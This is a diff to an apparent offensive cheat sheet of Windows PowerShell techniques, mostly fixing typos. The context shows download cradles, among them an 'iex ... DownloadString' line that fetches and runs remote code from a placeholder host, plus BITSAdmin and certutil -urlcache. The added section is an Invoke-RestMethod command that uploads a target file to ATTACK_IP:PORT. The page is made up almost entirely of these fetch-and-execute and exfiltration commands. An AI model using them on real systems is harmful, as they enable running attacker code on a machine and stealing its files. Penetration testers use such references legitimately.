@@ -1,4 +1,4 @@
-# Windows Powershell
+# Windows PowerShell
 
 ### 1) In Memory
 
@@ -18,7 +18,7 @@
 
     BITSAdmin.exe
 
-    Cerutil.exe w/ -urlcahche argument
+    Cerutil.exe w/ -urlcache argument
 
 ### 3) Net.WebClient Download String Method
 
@@ -28,7 +28,7 @@
 
     iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")
 
-##### Internet Explorer Downoad cradle
+##### Internet Explorer Download cradle
 
     $ie=New-Object -ComObject
     InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://<IP>/<File>
@@ -75,6 +75,10 @@
 			    <execute>Get-Process</execute>
 		    </a>
     </command>
+
+### 7) Invoke-RestMethod
+
+	Invoke-RestMethod -Uri http://ATTACK_IP:PORT/REMOTE_FILE -Method PUT -InFile TARGET_FILE
 
 # TIPS AND TRICKS
 
